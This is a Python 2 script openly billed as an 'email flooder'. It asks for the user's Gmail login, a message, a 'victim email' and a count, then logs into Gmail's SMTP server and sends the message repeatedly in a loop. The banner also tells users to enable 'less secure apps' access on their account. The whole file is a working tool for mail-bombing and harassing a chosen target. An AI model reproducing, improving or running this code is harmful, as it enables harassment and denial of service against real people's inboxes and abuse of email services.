# -*- coding: utf-8 -*-

import os
import sys
import time
import webbrowser
import smtplib
import getpass
from sys import platform


if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "win32":
    os.system("cls")


count = 0

print"""
\033[1;32m ███    ███                   █████████████████████████████████████████████\033[39m
\033[1;32m ████  ████\033[39m                   █ WELCOME TO THE MASTERPIEC3+ EMAIL FLOODER █
\033[1;32m ██ ████ ██  ██████\033[39m           █                                           █
\033[1;32m ██  ██  ██       ██    ██ \033[39m   █                 \033[31mIMPORTANT:\033[39m                █
\033[1;32m ██      ██   █████   ██████\033[39m  █    USE A GMAIL ACCOUNT TO SEND EMAILS     █
\033[1;32m                  ██    ██\033[39m    █                                           █
\033[1;32m             ██████\033[39m           █  ACTIVATE THE ACCESS TO LESS SECURE APPS  █
                              █   ON YOUR EMAIL SECURITY CONFIGURATIONS   █
                              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
      
                                                             \033[1;32mcoded by fisic\033[39m 
                                                             """

try:
    print ""
    gmail = raw_input(" \033[96m@MasterPiec3+>\033[93m YOUR EMAIL HERE [GMAIL]:\033[39m ")
    passwd = getpass.getpass(" \033[96m@MasterPiec3+>\033[93m YOUR PASSWORD:\033[39m ")
    msg = raw_input(" \033[96m@MasterPiec3+>\033[93m MESSAGE:\033[39m ")
    to = raw_input(" \033[96m@MasterPiec3+>\033[93m VICTIM EMAIL:\033[39m ")
    send = input(" \033[96m@MasterPiec3+>\033[93m NUMBER OF EMAILS:\033[39m ")
    time.sleep(1)
    print " \033[96m@MasterPiec3+>\033[93m BUILDING YOUR EMAILS... PLEASE WAIT...\033[39m"
    time.sleep(3)
    print " \033[96m@MasterPiec3+>\033[1;32m DONE! \033[39m"
    time.sleep(1)
    print " \033[96m@MasterPiec3+>\033[1;32m SENDING EMAILS... \033[39m"
except KeyboardInterrupt:
    print ""
    print "\033[96m @MasterPiec3+>\033[31m EXITING... \033[39m"
    time.sleep(2)
    exit
except EOFError:
    print ""
    print "\033[96m @MasterPiec3+>\033[31m ERROR, EXITING...  \033[39m"
    time.sleep(2)
    exit
try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail, passwd)
    for e in range( 0, +send):
        count +=1
        print " \033[96m@MasterPiec3+>\033[1;32m SENDING EMAIL \033[31m{0}\033[39m".format(count)
        server.sendmail(gmail, to, msg)
except KeyboardInterrupt:
    print ""
    print "\033[96m @MasterPiec3+>\033[31m EXITING...\033[39m"
    time.sleep(2)
    exit